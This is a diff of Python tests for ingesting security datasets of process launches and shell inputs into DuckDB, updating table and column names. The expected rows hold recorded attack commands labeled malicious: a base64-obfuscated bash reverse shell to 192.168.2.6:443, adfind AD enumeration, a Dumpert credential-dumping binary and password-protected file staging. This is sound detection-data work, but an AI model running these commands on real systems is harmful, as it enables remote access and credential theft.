@@ -65,16 +65,20 @@ def test_lade_authentic_groundtruth_and_processed_selection(tmp_path, pwsh):
     result = ingest(root, database, "from _ingest_lade import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        rows = con.execute("SELECT pgm,args,label,group_id,shell_input,other_tokens FROM COMMANDS ORDER BY rowid").fetchall()
-        assert len(rows) == 3, "LADE's matching Processed copy or Resolved Code was imported twice"
-        assert rows[0][:4] == ("Test-Connection", ["-ComputerName", "192.168.1.1", "-Count", "3", "-Quiet"], "benign", None)
-        assert rows[1][:4] == ("adfind.exe", ["-f", "(objectcategory=person)"], "malicious", None)
-        assert rows[1][4:] == ('"adfind.exe" -f (objectcategory=person) > ad_users.txt', [">", "ad_users.txt"])
-        assert rows[2][4:] == (None, []), "Process telemetry must not become submitted shell input"
+        rows = con.execute("SELECT pgm,args,dataset_label,group_id FROM PROCESS_LAUNCHES ORDER BY rowid").fetchall()
+        assert len(rows) == 3, "LADE matching Processed copies must not duplicate parsed commands"
+        assert rows[0] == ("Test-Connection", ["-ComputerName", "192.168.1.1", "-Count", "3", "-Quiet"], "benign", None)
+        assert rows[1] == ("adfind.exe", ["-f", "(objectcategory=person)"], "malicious", None)
+        shells = con.execute("SELECT pgms,dataset_label,group_id,shell_input,tokens FROM SHELL_INPUTS ORDER BY rowid").fetchall()
+        assert len(shells) == 2, "LADE's matching Processed copy or Resolved Code was imported twice"
+        assert shells[0][:3] == (["Test-Connection"], "benign", None)
+        assert shells[1][:3] == (["adfind.exe"], "malicious", None)
+        assert shells[1][3] == '"adfind.exe" -f (objectcategory=person) > ad_users.txt'
+        assert shells[1][4][-2:] == [">", "ad_users.txt"]
     again = ingest(root, database, "from _ingest_lade import records\n")
     assert again.returncode == 0, again.stderr
     with duckdb.connect(str(database)) as con:
-        assert con.execute("SELECT count(*) FROM COMMANDS").fetchone()[0] == 3
+        assert con.execute("SELECT count(*) FROM PROCESS_LAUNCHES").fetchone()[0] == 3
 
 
 def test_otrf_authentic_dumpert_sources_merge(tmp_path):
@@ -97,13 +101,13 @@ files:
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        rows = con.execute("SELECT pgm,args,label,group_id,shell_input,other_tokens FROM COMMANDS").fetchall()
-        assert rows == [(r"C:\Users\wardog\Desktop\Outflank-Dumpert.exe", [], "malicious", None, None, [])], \
+        rows = con.execute("SELECT pgm,args,dataset_label,group_id FROM PROCESS_LAUNCHES").fetchall()
+        assert rows == [(r"C:\Users\wardog\Desktop\Outflank-Dumpert.exe", [], "malicious", None)], \
             "OTRF's two providers must merge by host, PID, image and execution time"
     again = ingest(root, database, "from _ingest_otrf import records\n")
     assert again.returncode == 0, again.stderr
     with duckdb.connect(str(database)) as con:
-        assert con.execute("SELECT count(*) FROM COMMANDS").fetchone()[0] == 1
+        assert con.execute("SELECT count(*) FROM PROCESS_LAUNCHES").fetchone()[0] == 1
 
 
 def test_otrf_reused_pid_distinct_capture_and_time(tmp_path):
@@ -120,7 +124,7 @@ def test_otrf_reused_pid_distinct_capture_and_time(tmp_path):
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        assert con.execute("SELECT count(*) FROM COMMANDS").fetchone()[0] == 4
+        assert con.execute("SELECT count(*) FROM PROCESS_LAUNCHES").fetchone()[0] == 4
 
 
 def test_otrf_azure_failed_exec_and_truncated_sysmon(tmp_path):
@@ -134,10 +138,10 @@ def test_otrf_azure_failed_exec_and_truncated_sysmon(tmp_path):
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        rows = con.execute("SELECT pgm,args,os,shell_input,group_id FROM COMMANDS ORDER BY rowid").fetchall()
+        rows = con.execute("SELECT pgm,args,os,group_id FROM PROCESS_LAUNCHES ORDER BY rowid").fetchall()
         assert rows == [
-            ("/usr/local/sbin/bash", [], "linux", None, None),
-            ("/bin/bash", ["-c", "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}"], "linux", None, None),
+            ("/usr/local/sbin/bash", [], "linux", None),
+            ("/bin/bash", ["-c", "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}"], "linux", None),
         ], "AUOMS must retain failed attempts, preserve quoting and merge the matching Sysmon launch"
 
 
@@ -163,11 +167,15 @@ def test_lade_static_script_invocations_and_scenario_labels(tmp_path, pwsh):
     assert result.returncode == 0, result.stderr
     assert not marker.exists(), "The PowerShell parser executed dataset text"
     with duckdb.connect(str(database)) as con:
-        rows = con.execute("SELECT pgm,args,label,group_id FROM COMMANDS ORDER BY rowid").fetchall()
+        rows = con.execute("SELECT pgm,args,dataset_label,group_id FROM PROCESS_LAUNCHES ORDER BY rowid").fetchall()
         assert [row[0] for row in rows] == [r"C:\Program Files\7-Zip\7z.exe", "Out-Null", "sleep", "ls", "foreach", "select", "Set-Content", "Invoke-Persistence", r"C:\Program Files\Mozilla Firefox\firefox.exe"]
         assert rows[0][1] == ["a", r"C:\StagedFiles.7z", "C:\\StagedFiles\\*", "-pSecurePass123"]
         assert rows[1][2] == rows[2][2] == rows[-1][2] == "benign"
         assert rows[-2][2:] == ("malicious", None)
+        shells = con.execute("SELECT pgms,shell_input,dataset_label,group_id FROM SHELL_INPUTS ORDER BY rowid").fetchall()
+        assert [row[0] for row in shells] == [["7z.exe", "Out-Null", "sleep", "ls", "foreach", "select"]]
+        assert shells[0][1] == code
+        assert shells[0][2:] == ("malicious", None)
 
 
 def test_otrf_metadata_and_host_scoped_process_ancestry(tmp_path):
@@ -200,11 +208,11 @@ files:
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        assert con.execute("SELECT label FROM COMMANDS ORDER BY rowid").fetchall() == [
+        assert con.execute("SELECT dataset_label FROM PROCESS_LAUNCHES ORDER BY rowid").fetchall() == [
             ("malicious",), ("malicious",), ("benign",), ("malicious-group",),
             ("malicious-group",), ("malicious-group",), ("benign",), ("malicious",),
         ]
-        assert con.execute("SELECT args FROM COMMANDS WHERE pgm LIKE '%notepad.exe'").fetchone() == ([],)
+        assert con.execute("SELECT args FROM PROCESS_LAUNCHES WHERE pgm LIKE '%notepad.exe'").fetchone() == ([],)
 
 
 def test_otrf_linux_audit_exec_filter_and_sessions(tmp_path):
@@ -225,7 +233,7 @@ def test_otrf_linux_audit_exec_filter_and_sessions(tmp_path):
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        rows = con.execute("SELECT pgm,args,session_id,group_id FROM COMMANDS ORDER BY record_id").fetchall()
+        rows = con.execute("SELECT pgm,args,session_id,group_id FROM PROCESS_LAUNCHES ORDER BY record_id").fetchall()
         assert len(rows) == 3, "Only two authentic execs and one failed attempt should survive"
         assert rows[0][:2] == ("/usr/sbin/arp", ["-a"])
         assert rows[1][:2] == ("/bin/grep", ["-v", "^?"])
@@ -269,12 +277,12 @@ files:
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        assert con.execute("SELECT pgm,label FROM COMMANDS ORDER BY record_id").fetchall() == [
+        assert con.execute("SELECT pgm,dataset_label FROM PROCESS_LAUNCHES ORDER BY record_id").fetchall() == [
             ("/usr/sbin/arp", "malicious"), ("/bin/grep", "malicious"),
             ("/bin/true", "malicious-group"), ("/usr/bin/id", "malicious-group"),
             ("/missing/program", "malicious-group"),
         ]
-        assert con.execute("SELECT args FROM COMMANDS WHERE pgm='/missing/program'").fetchone() == ([],)
+        assert con.execute("SELECT args FROM PROCESS_LAUNCHES WHERE pgm='/missing/program'").fetchone() == ([],)
 
 
 def test_otrf_authentic_unprompted_dd_attack_metadata(tmp_path):
@@ -288,6 +296,6 @@ def test_otrf_authentic_unprompted_dd_attack_metadata(tmp_path):
     result = ingest(root, database, "from _ingest_otrf import records\n")
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        assert con.execute("SELECT pgm,args,label,group_id FROM COMMANDS").fetchall() == [
+        assert con.execute("SELECT pgm,args,dataset_label,group_id FROM PROCESS_LAUNCHES").fetchall() == [
             ("/bin/dd", ["if=/dev/zero", "bs=1", "count=1"], "malicious", None),
         ]
